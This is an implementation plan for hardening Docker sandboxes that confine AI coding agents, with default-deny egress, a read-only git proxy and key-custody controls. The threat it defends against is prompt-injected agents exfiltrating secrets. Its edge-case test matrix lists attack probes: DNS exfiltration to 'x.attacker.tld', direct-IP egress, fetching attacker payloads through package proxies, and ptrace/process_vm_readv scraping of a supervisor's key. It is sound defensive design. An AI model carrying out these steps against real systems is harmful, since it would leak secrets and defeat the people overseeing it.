# P2-07 — Sandbox Hardening + Default-Deny Egress — Implementation Plan

**Task ID:** P2-07 · **Milestone:** M6 · **Priority:** P0 launch-tier security — the primary
prompt-injection exfiltration control.
**Depends on:** P2-05 (`MainguardEnv` + dockerd), P2-06 (ext4 worktrees to mount).
**Branch:** implement on `feature/P2-07-sandbox-hardening` off `phase2`; PR targets `phase2`.

> **Verification profile:** Automated container CI (`RequiresDocker`, PR-blocking) + **human security-evidence review**.
> Spec-builder rules are pure unit tests; egress/A6/G2 suites need the real Docker leg and are PR-blocking (launch-tier security, not nightly hygiene). This is a security-relevant PR (global rule 4): a human pastes executed check evidence (egress matrix output, inspect excerpts, proxy config, push-refusal audit event) and the reviewer re-runs at least one — the tests are the floor, not the ceiling.
>
> **Source of truth:** §P2-07 of `docs/phase-2/implementation_plans/Mainguard_Master_Implementation_Document_v2.md` (binds
> strategy §G-7.2c + the market promotion to launch tier). Global invariants **G-11** (no Windows
> mounts), **G-15** (hardened container spec is mandatory), **G-16** (no runtime `docker build`).
> This is a security-relevant PR (global rule 4): execute the listed security checks and paste
> evidence into the PR; the reviewer re-runs at least one.

---

## 0.a Binding companions (2026-07-12 refresh)

This plan was refreshed against the master doc as consolidated on `phase2` at `0f80d21`
(2026-07-12), and this branch now carries that baseline via the merge commit in its history:
the Lane-H engineering pass (1,115-test suite, zero-warning build, [ADR-001...007](../phase-2/ADRs.md)),
the design corpus under `docs/design/`, and the orchestration hardening specs under `docs/phase-2/`.
The items below are **binding** alongside this plan. Where this plan and a companion disagree,
the master doc wins -- and fix the drift here in the same PR.

| Companion | What binds |
|---|---|
| [Master doc](../phase-2/implementation_plans/Mainguard_Master_Implementation_Document_v2.md) §P2-07 | Contract, invariants, edge rows, rejection triggers -- the source of truth (note: the doc moved on 2026-07-11; older copies of this plan cited `docs/Mainguard_Master_Implementation_Document_v2.md`) |
| [Test strategy v2](../phase-2/implementation_plans/Mainguard_Test_Implementation_Strategy_v2.md) **TI-P2-07** | The binding expansion of this plan's test contract -- "a feature PR that does not satisfy its TI section is incomplete by definition." Where the table below and TI-P2-07 differ, implement the union. The §A.4 shared fixtures (`DaemonFixture`, `ScriptedAgentHarness`, `FakeModelEndpoint`, `DualRepoFixture`, `SandboxFixture`, `AuditProbe`) are infrastructure contracts: hand-rolling what a fixture provides is a review rejection |
| [`DesignSystem.md`](../design/DesignSystem.md) (2026-07 design pass) | Any UI surface this task ships: corrected lane palette, state-encoding icon gates, accessibility gates, motion grammar; surfaces route through the [design hub](../design/README.md) |
| **Launch-blocker / hardening gates** | **OPS A6 (no direct git-host egress) + G2 anti-memory-inspection quartet + SA-1/F5 package-proxy caveat** ([`Mainguard_Orchestration_Protocol_Spec.md`](../phase-2/Mainguard_Orchestration_Protocol_Spec.md) §3.7/§6.1; [red-team plan](../phase-2/Mainguard_Orchestration_RedTeam_Plan.md) §4) -- see the 2026-07-12 additions sections below |

---

## 0. Context — what exists today

P2-06 gives the daemon ext4 worktrees; nothing containerizes agents yet. This task ships the
container runtime: a hardened Docker container per agent plus a default-deny egress proxy, so a
prompt-injected agent cannot exfiltrate secrets or reach arbitrary hosts. P2-01's
`CredentialInjector` content lands on a per-agent tmpfs here.

### What you can rely on

| Fact | Where |
|---|---|
| `CredentialInjector.BuildEnvFileContent` (in-memory env-file content) | `Mainguard.Agents/Security/CredentialInjector.cs` (P2-01) |
| Ext4 worktree paths per agent; quarantine `origin` | `Mainguard.Agents/Agents/WorktreeManager.cs` (P2-06) |
| Daemon host, gRPC, logging mask | `Mainguard.Server/` (P2-02) |
| dockerd inside `MainguardEnv` (socket waited on at bootstrap) | P2-05 |

Dependencies to add (daemon only): `Docker.DotNet`. The UI must never reference it (G-18).

---

## 1. Files to create / modify

| Action | Path |
|---|---|
| **Create** | `Mainguard.Agents/Agents/Sandbox/SandboxEngine.cs` (`ISandboxEngine` + Docker impl) |
| **Create** | `Mainguard.Agents/Agents/Sandbox/ContainerSpecBuilder.cs` (pure: agent params → `CreateContainerParameters`) |
| **Create** | `Mainguard.Agents/Agents/Sandbox/EgressProxyConfigurator.cs` (network + proxy container + allowlist) |
| **Create** | `Mainguard.Agents/Agents/Sandbox/EgressAllowlist.cs` (model + persistence + change log events) |
| **Create** | `Mainguard.Agents/Agents/Sandbox/DaemonGitProxy.cs` (A6: read-only, prefix-allowlisted daemon-side git fetch/clone; no push code path) |
| **Create** | `Mainguard.Agents/Agents/Sandbox/DeclaredDependencyResolver.cs` (F5: resolves `go.mod`/`package.json`/lockfiles to the exact module set the package proxy may serve) |
| **Create** | `images/mainguard-agent-base/` (Dockerfile for the static base image with Nix/Devbox; built in CI/release pipeline, **never at runtime**) |
| **Create** | `images/mainguard-egress-proxy/` (proxy image config: e.g. tinyproxy/squid + dnsmasq pinned DNS + iptables rules script) |
| **Edit** | `Mainguard.Server` wiring (engine construction; spawn path consumes P2-06 worktrees) |
| **Create** | `Mainguard.App.Shell/ViewModels/EgressAllowlistViewModel.cs` + view (user-visible/editable allowlist; changes logged) |
| **Create** | `Mainguard.Tests/ContainerSpecBuilderTests.cs`, `EgressAllowlistTests.cs`, `Mainguard.Tests/Integration/EgressMatrixTests.cs` (tagged `RequiresDocker`), `SandboxInspectTests.cs` (tagged `RequiresDocker`) |
| **Edit** | `AGENTS.md` Repository Map |

---

## 2. Contract (binding)

**`SandboxEngine`** (Docker.DotNet `CreateContainerAsync`):

- Static base image with Nix/Devbox — toolchains sideload via `devbox add` into the running
  container; **no runtime `docker build`** (G-16 — it severs PTYs).
- Container spec: `no-new-privileges`, **userns remap**, **seccomp profile that additionally
  denies `process_vm_readv`/`process_vm_writev`/`ptrace`** (G2 control 3 — never `unconfined`),
  **no `CAP_SYS_PTRACE` in the agent capability set** (G2 control 4), memory + pids limits,
  worktree mount **from ext4 only** (G-11), tmpfs `/dev/shm` and a per-agent credentials tmpfs
  (P2-01 injector content, file mode **0400**) — **with the OOB session HMAC key `K` on a
  separate tmpfs file, mode 0400, owned by a dedicated *supervisor uid* distinct from the
  agent-CLI uid** (OPS decision C / G2 control 1, `Mainguard_Orchestration_Protocol_Spec.md` §6.1),
  read-only rootfs where tolerated.
- Per-repo persistent jail: containers are reused across sessions (`docker start` if stopped),
  keyed by repo hash + agent id.

**`EgressProxyConfigurator`:**

- An internal Docker network whose **only** route out is a proxy container; default-deny.
- Allowlist = model APIs + package registries (**pull-only by protocol**: crates / Go proxy /
  npm / PyPI / NuGet). **The repo's git host is NOT on the agent allowlist** (OPS decision A6,
  §3.7) — git-sourced installs go through the daemon read-git-proxy (§3.6). DNS pinned to the
  proxy.
- `HTTP(S)_PROXY` env **and** iptables DROP on direct egress (proxy-env-only enforcement is a
  rejection trigger).
- Allowlist user-visible and editable; every change logged (feeds P2-17 network transparency).

**`DaemonGitProxy` (A6 — new since the 2026-07-12 refresh):** an internal, daemon-mediated
**read-only** git endpoint — the only path from a sandbox to the git host. It performs
`fetch`/`clone` daemon-side (or via a caching mirror) for **allowlisted host+org prefixes only**
and **refuses `push`/`receive-pack` structurally** (no push code path exists). Every proxied
fetch is a P2-17 transparency line; every *attempted* push is denied **and audited** (feeds
P2-44).

---

## 3. Implementation steps

### 3.1 `ContainerSpecBuilder` (pure — unit-testable heart)

Input: `(repoHash, agentId, worktreePath, imageRef, limits, networkName, credTmpfsSpec)` →
`CreateContainerParameters` with:

```
HostConfig:
  SecurityOpt   = ["no-new-privileges"]            // + default seccomp (do not pass unconfined)
  UsernsMode    = per daemon userns-remap config
  Memory        = limits.MemoryBytes; PidsLimit = limits.Pids
  ReadonlyRootfs= true where the base image tolerates it (rw /tmp, /home/agent via tmpfs/volumes)
  Mounts        = [{ Source: <ext4 worktree>, Target: /workspace, Type: bind }]   // ext4 ONLY
  Tmpfs         = { "/dev/shm": "", "/run/secrets": "size=1m,mode=0700" }
  NetworkMode   = <internal agent network>
Env             = HTTP_PROXY/HTTPS_PROXY/NO_PROXY → proxy; never secrets (G-13)
```

The builder **throws typed** if the worktree source matches `^/mnt/[a-z]/`, a UNC, or a Windows
drive pattern — G-11 enforced at construction, not just inspected after. The builder also
**asserts the G2 per-container controls on the create request** (see §3.6): the seccomp
denylist for `process_vm_readv`/`process_vm_writev`/`ptrace`, the absence of `CAP_SYS_PTRACE`,
and the supervisor-uid ownership spec for the K/credential tmpfs — dropping any of them is a
typed builder error, not a warning.

### 3.2 Credentials tmpfs (+ G2 key custody)

Spawn writes `BuildEnvFileContent` output into the container's `/run/secrets/agent.env` via
Docker exec/attach copy after start (content never on persistent disk, never in `Env`, never
argv), `chmod 0400`, owner = agent uid. Adapter launch sources it. **Per-agent** tmpfs: no
`~/.claude` or global auth-dir mounts, ever (invariant).

**The OOB session HMAC key `K` lives on a *separate* tmpfs file** (`/run/secrets/oob.key`),
mode **0400, owned by the dedicated supervisor uid ≠ the agent-CLI uid** (OPS decision C / G2
control 1). The agent uid must be unable to obtain `K` by **any** path — file read (closed by
control 1) or supervisor memory scrape (closed by controls 3+4, hardened by control 2 — §3.6).

### 3.3 Egress network

- `EnsureNetworkAsync`: create internal network `mainguard-agents` (`Internal = true`) + attach the
  proxy container with a second leg on the egress-capable network.
- **Amended by MG-36 (2026-07-26) — one segment per agent, not one shared segment.** As originally
  built, every jail attached to the single `mainguard-agents` network, which contained egress to the
  internet and kept the daemon unreachable but left **no east-west control at all**: agent A could
  dial agent B's container IP and any port B had open. `mainguard-agents` is now the proxy's own
  agent-side home leg, and each jail gets its own internal `mainguard-agent-<repo>-<agent>` network
  whose only other member is the proxy. Why segments rather than an intra-network isolation policy:
  Docker's one knob for this, `com.docker.network.bridge.enable_icc=false`, is all-or-nothing — it
  drops jail→proxy along with jail→jail (measured against a real daemon), so "one network, tenants
  isolated from each other but not from the proxy" cannot be expressed. Punching a hole back through
  it would need a rule in the VM's host network namespace, and the daemon runs as an unprivileged VM
  user whose only capability is membership of the `docker` group. Attaching the running proxy to a
  new segment is additive (its pid and its existing legs' addresses/MACs are untouched), so this does
  not re-open the "recreating the proxy strands running jails" failure. Consequences: the proxy holds
  one address per segment, so the MG-18 backstop is rendered with all of them; the jail's
  `HTTP(S)_PROXY` and MG-7 resolver pin use the proxy's address **on that segment** rather than its
  name (one dnsmasq cannot answer a name differently per client); and segments are reclaimed at
  teardown, because Docker's default local bridge pool is only ~32 networks deep.
- Proxy container: allowlist-driven HTTP(S) CONNECT proxy; dnsmasq answering **only** allowlisted
  names (everything else NXDOMAIN → kills DNS exfiltration); iptables inside the agent network
  namespace (or on the proxy as the only gateway) DROP non-proxy egress.
- Allowlist model: named entries with hostname patterns; defaults: `api.anthropic.com`,
  `api.openai.com`, `registry.npmjs.org`, `pypi.org`/`files.pythonhosted.org`, `nuget.org`
  endpoints, crates.io. **The provisioned repo's git host is deliberately NOT a default and the
  UI marks a user-added git-host entry as defeating A6** (OPS §3.7: removing the direct route is
  the structural control; the read path is the daemon git proxy). Persisted per repo; UI edit +
  change-logging event (`AllowlistChanged{who,when,entry,action}`) — P2-15 chains it later,
  P2-17 displays it.

### 3.3a A6 — daemon read-only git proxy (2026-07-12 addition)

`DaemonGitProxy`: an internal endpoint on the agent network (proxied hostname, e.g.
`git.mainguard.internal`) that the sandbox's git config rewrites git-host URLs to
(`url.<proxy>.insteadOf`). Behavior:

1. `upload-pack` (fetch/clone) **only**, and only for **allowlisted host+org prefixes**
   (per-repo config; the provisioned repo's own org is the default entry). The fetch itself is
   performed daemon-side (or served from a caching mirror) with the daemon's credentials — the
   sandbox never holds git-host credentials (P2-06 quarantine invariant intact).
2. `receive-pack`/push: **no code path exists** — the refusal is structural, not a policy check;
   every attempt is denied + audited (`egress_denied` event; feeds P2-44).
3. Every proxied fetch emits a P2-17 transparency line (host, org/repo, agent, bytes, verdict).
4. Non-allowlisted prefix → typed refusal + transparency line.

This serves `pip install git+https://…`, Go module fetches, and git submodules without the git
host ever being reachable from the sandbox.

### 3.3b F5 — package-proxy caveat (2026-07-12 addition; accepted-and-stated residual)

**"Pull-only" ≠ "cannot fetch attacker code" ≠ "cannot exfil"** (OPS SA-1 / F5): a wholesale
allowlisted language proxy (Go proxy, npm, crates) is a general-purpose fetch channel —
`go get github.com/attacker/payload` resolves second-stage payloads and leaks bytes in request
paths. Therefore:

- **Prefer declared-dependency scoping:** route module fetches through the same daemon proxy,
  with `DeclaredDependencyResolver` resolving `go.mod`/`package.json`/lockfiles to the exact
  module set; requests outside it are denied (typed) + logged.
- Where a native proxy front cannot be replaced (registry protocol constraints), every
  package-proxy fetch is a P2-17 transparency line **and** a P2-44 anomaly signal — never
  silent.
- The residual (public-payload pull + low-bandwidth request-path exfil via an allowlisted
  registry) is **accepted and stated** in `docs/security-architecture.md` (P2-17), bounded by
  no-push/no-creds and the verify→review→human-merge backstop.

### 3.3c G2 — anti-memory-inspection quartet (2026-07-12 addition)

The A1 forgery-[STRUCT] guarantee depends on the agent uid obtaining **zero bytes of `K`** by
any path. The four controls ship **together** (OPS decision C / G2, §6.1; dropping 1, 3, or 4
regresses S-9/S-6):

| # | Control | Placement |
|---|---|---|
| 1 | K/credential tmpfs mode 0400 owned by the dedicated supervisor uid ≠ agent-CLI uid | per-container (§3.2, spec builder) |
| 2 | `kernel.yama.ptrace_scope ≥ 2` | **VM-wide boot sysctl — provisioned by the P2-05 bootstrapper, NOT here.** It is a non-namespaced sysctl; Docker's `CreateContainerAsync`/`--sysctl` cannot set it. Never assert it on the create request |
| 3 | seccomp profile denying `process_vm_readv`/`process_vm_writev`/`ptrace` | per-container (spec builder) |
| 4 | no `CAP_SYS_PTRACE` in the agent capability set | per-container (spec builder) |

The in-container memory scrape is closed **structurally by (3)+(4) alone**; (1) closes the file
path; (2) is defense-in-depth.

### 3.4 `SandboxEngine` lifecycle

`SpawnAsync` (create-or-start persistent jail: `docker start` when a stopped container exists —
edge: base-image upgrade recreates), `ExecAsync` (devbox add etc.), `StopAsync`, `RemoveAsync`.
Docker is the sole source of truth for liveness (P2-08 reconciler consumes this; no PID files).

### 3.5 Optional sbx backend (MAY — acceptable variation)

`ISandboxEngine` is the seam: a `DockerSandboxEngine` (this task) and, optionally later, an
`SbxSandboxEngine` (Docker Sandboxes microVM + Locked-Down egress preset). Do **not** make sbx a
hard dependency (rejection trigger). Keep the interface engine-agnostic (no Docker.DotNet types in
`ISandboxEngine`'s signature).

---

## 4. Edge-case matrix (binding — each row needs a test; egress rows in the `RequiresDocker` integration suite)

| Case | Required behavior |
|---|---|
| allowlisted `curl https://api.anthropic.com` | succeeds via proxy |
| `curl https://example.com` | fails **fast** (connection refused by proxy policy, not a timeout) |
| direct-IP egress (`curl http://1.1.1.1`) | fails (iptables DROP — proves the backstop, not just proxy env) |
| DNS exfil (`dig x.attacker.tld`) | fails (pinned DNS answers allowlisted names only) |
| `devbox add jq` during a live PTY session | survives — session uninterrupted, tool available |
| worktree source on `/mnt/c` | spec builder throws typed; container never created |
| stopped persistent jail respawned | `docker start` path; same container id, state preserved |
| **A6:** `pip install git+https://<allowlisted-host>/<allowlisted-org>/repo` | fetch succeeds **through the daemon read-git-proxy** |
| **A6:** direct `git clone https://<git-host>/…` from the agent (bypassing the proxy) | fails fast — git host absent from the agent allowlist |
| **A6:** `git push`/`receive-pack` through the proxy | refused (no code path) + audited |
| **A6:** fetch of a non-allowlisted host+org prefix through the proxy | refused, transparency-logged |
| **F5:** `go get`/npm fetch of a non-declared VCS dependency | scoped-out (declared-dep proxy) **or** transparency line + P2-44 anomaly — never silent |
| **G2:** agent uid reads `/run/secrets/oob.key` | denied (0400 + supervisor uid) |
| **G2:** agent uid `ptrace`/`process_vm_readv` against the supervisor process | denied (seccomp denylist + no `CAP_SYS_PTRACE`; yama backstop) — zero key bytes obtained |

---

## 5. Invariants (MUST)

1. **G-11 / G-15 / G-16** — every one asserted by a test, not just reviewed.
2. Every verification bullet below is **evidenced in the PR description** (security-relevant PR
   rule): egress matrix output, `docker inspect` excerpts, the A6 proxy config showing **no
   git-host allow entry**, and a proxied-push refusal + audit event.
3. Credential tmpfs is per-agent; no global auth-dir mounts. `K` on its own tmpfs file owned by
   the supervisor uid (G2 control 1).
4. **A6:** the agent allowlist contains no git-host entry; `DaemonGitProxy` is the only path to
   the git host, prefix-allowlisted, with push refusal structural (no push code path).
5. **G2:** the spec builder asserts controls (1), (3), (4) on every create request; control (2)
   is asserted by the P2-05 VM boot check (`kernel.yama.ptrace_scope ≥ 2`), never per-container.
6. The UI talks to sandboxes only via the daemon (no `Docker.DotNet` in `Mainguard.App.Shell`, G-18).

---

## 6. Test contract

| # | Test | Assertion |
|---|---|---|
| 1 | `SpecBuilder_HardeningFlags` | `no-new-privileges`, userns, memory/pids limits, tmpfs entries all present on the create request — **plus the G2 per-container assertions: seccomp denylist (`process_vm_readv`/`process_vm_writev`/`ptrace`), no `CAP_SYS_PTRACE`, supervisor-uid ownership of the K/credential tmpfs** |
| 2 | `SpecBuilder_RejectsWindowsMounts` | `/mnt/c/...`, `C:\...`, `\\wsl.localhost\...` sources → typed throw |
| 3 | `SpecBuilder_NoSecretsInEnv` | env contains proxy vars only; a "secret" input surfaces nowhere in the spec |
| 4 | `Allowlist_DefaultsAndPersistence` | defaults present (**no git-host entry**); add/remove round-trips; change events emitted |
| 5 | `EgressMatrix_*` (`RequiresDocker`) | the base egress rows above, end-to-end in `MainguardEnv`/Linux CI |
| 6 | `Inspect_NoWindowsPaths_UsernsLimits` (`RequiresDocker`) | `docker inspect` on a spawned agent: zero `/mnt/c`/`drvfs`/UNC mounts; userns + limits live (G-11 test promised by P2-06) |
| 7 | `PersistentJail_StartNotRecreate` (`RequiresDocker`) | second spawn reuses the container |
| 8 | `CredTmpfs_Mode0400_TmpfsBacked` (`RequiresDocker`) | in-container `stat`: 0400, tmpfs mount; file absent on VM disk |
| 9 | `GitProxy_AllowlistedPrefixFetch_Succeeds` (`RequiresDocker`, **A6 suite**) | `clone`/`fetch` of an allowlisted host+org prefix through `DaemonGitProxy` succeeds; transparency line emitted |
| 10 | `GitProxy_PushRefusedAndAudited` (`RequiresDocker`, **A6 suite**) | `push`/`receive-pack` through the proxy → refusal + audit event; no ref moved |
| 11 | `GitProxy_NonAllowlistedPrefix_Refused` (`RequiresDocker`, **A6 suite**) | fetch of a non-allowlisted prefix → typed refusal + transparency line |
| 12 | `DirectGitHostClone_FailsFast` (`RequiresDocker`, **A6 suite**) | `git clone https://<git-host>/…` from the agent bypassing the proxy → fails fast (host absent from allowlist) |
| 13 | `PackageProxy_ArbitraryVcsFetch_ShouldBeScopedOrTransparencyLogged` (**F5**) | `go get`/npm of a non-declared VCS dependency → denied by the declared-dep scope, or surfaces as transparency line + P2-44 anomaly — never silent |
| 14 | `SupervisorMemory_NotReadableByAgent_ViaPtraceOrVmRead` (`RequiresDocker`, **G2 key custody — mirrors OPS §9 test 13**) | from the agent uid: reading `K` from the tmpfs file AND scraping it from supervisor process memory (`ptrace`/`process_vm_readv`) are **both denied** — zero key bytes obtained |

Note: the **G2 control (2) boot assertion** (`kernel.yama.ptrace_scope ≥ 2` in the VM) lives in
the **P2-05** test contract — it cannot be asserted on a container create request.

---

## 7. Rejection triggers / Reviewer script

**Rejection:** proxy-env-only enforcement (no iptables backstop); a "temporary" `--privileged`;
making sbx a hard dependency; runtime `docker build` (grep `ImageBuild`); any secret in `Env`;
**a git-host entry on the agent allowlist** (A6); **a push/`receive-pack` code path in
`DaemonGitProxy`** (the refusal must be structural); **shipping fewer than all four G2 controls**
(dropping 1, 3, or 4 regresses S-9 forgery-[STRUCT]); **asserting `ptrace_scope` on the container
create request** (it is VM-wide, P2-05's job).

```bash
dotnet build Mainguard.slnx
dotnet test --filter "FullyQualifiedName~ContainerSpecBuilder|FullyQualifiedName~EgressAllowlist|FullyQualifiedName~GitProxy|FullyQualifiedName~DeclaredDependency"
# inside MainguardEnv / Linux CI:
dotnet test --filter "Category=RequiresDocker"
grep -rn "ImageBuild" Mainguard.Agents/ Mainguard.Server/      # 0 hits (G-16)
grep -rn "Privileged" Mainguard.Agents/Agents/Sandbox/       # 0 true assignments
grep -rn "Docker.DotNet" Mainguard.App.Shell/                    # 0 hits (G-18)
grep -rn "receive-pack\|ReceivePack" Mainguard.Agents/Agents/Sandbox/DaemonGitProxy.cs  # refusal-only handling, no push implementation
docker inspect <agent> | grep -i "mnt/c\|drvfs"          # 0 hits — paste into PR
# paste into PR: proxy config showing no git-host allow entry; a proxied-push refusal + its audit event
```

---

## 8. Definition of done

- [ ] Hardened spec builder (typed Windows-mount rejection; G2 controls 1/3/4 asserted on every create request) + `SandboxEngine` persistent jails.
- [ ] Egress: internal network + proxy + pinned DNS + iptables backstop; editable, logged allowlist **with no git-host entry** (A6).
- [ ] `DaemonGitProxy`: prefix-allowlisted read-only fetch path; push structurally impossible + audited; transparency lines flowing.
- [ ] F5: declared-dependency-scoped package fetches (or transparency + anomaly signal where a native front must stay); residual stated in `docs/security-architecture.md`.
- [ ] Credentials on per-agent tmpfs 0400; `K` on its own supervisor-uid tmpfs; no secrets in env/argv/spec.
- [ ] Full egress matrix + A6 suite + G2 key-custody test + inspect assertions green in Docker CI; evidence pasted in the PR (incl. proxy config + push refusal audit event).
- [ ] Test contract satisfied as the **union** of §6 and TI-P2-07.
- [ ] `AGENTS.md` Repository Map updated. One task = one PR linking **P2-07**, base `phase2`.
